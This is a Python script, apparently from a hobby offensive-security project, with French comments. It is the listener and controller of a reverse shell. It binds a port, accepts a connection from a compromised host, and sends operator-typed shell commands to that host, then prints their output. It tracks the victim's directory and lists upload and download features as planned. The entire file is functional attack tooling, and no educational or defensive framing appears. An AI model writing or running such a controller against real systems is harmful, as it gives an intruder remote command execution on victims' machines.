#!/usr/bin/python3

# A python Reverse-shell
# Developed by Elieroc
# Start of project : 25/11/2020
# Actual version : 1.2
# Bug of "cd" command was fixed and the path was be colored

# Prochainement : Upload and Download functions + Fix the errored command

import socket

def main():

    host, port = ('192.168.1.100', 5555)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    print('Le serveur est démarré !'+"\n")

    while True:
        sock.listen()
        conn, address = sock.accept()

        # On reçoit l'ip qui s'est connectée en premier
        client_ip = conn.recv(9999).decode("utf8")

        print(" |$| Client connecté : " + client_ip + " | " + str(port) + "\n")

        # On reçoit le path ensuite
        path = conn.recv(9999).decode("utf8")

        while True:

            banned_command = ["nano", "vi", "vim", "clear"]
            banned = 0

            # On met la couleur du path en Bleue
            print("\033[1;36m")

            # On affiche le Path + Couleur Blanche (Gras)
            print(path + "\033[1;37m")

            data = str( input("\033[1;31m$ \033[1;37m") )


            for command in banned_command:
                # On check le premier mot de la commande
                if data.split(' ', 1)[0] == command:
                    print("Cette commande n'est pas utilisable")
                    # On envoie une information vide pour ne pas perdre la connexion
                    null = " "
                    null = null.encode("utf-8")
                    conn.send(null)
                    # On met l'état banned à 1 pour une vérification future
                    banned = 1

            if data[:2] == "cd":
                data = data.encode("utf8")
                conn.send(data)
                path = conn.recv(9999).decode("utf-8", errors="ignore")
                continue

            if data == "exit":
                print("Merci d'avoir utilisé Geckosec Framework !\n")
                conn.close()
                sock.close()
                return 0

            else:
                if banned == 0:
                    try:
                        data = data.encode("utf8")
                    except:pass
                    conn.send(data)

                    data = conn.recv(9999)
                    data = str( data.decode("utf-8", errors="ignore"))
                    print("\n"+data)
                else:
                    continue

    conn.close()
    sock.close()

main()
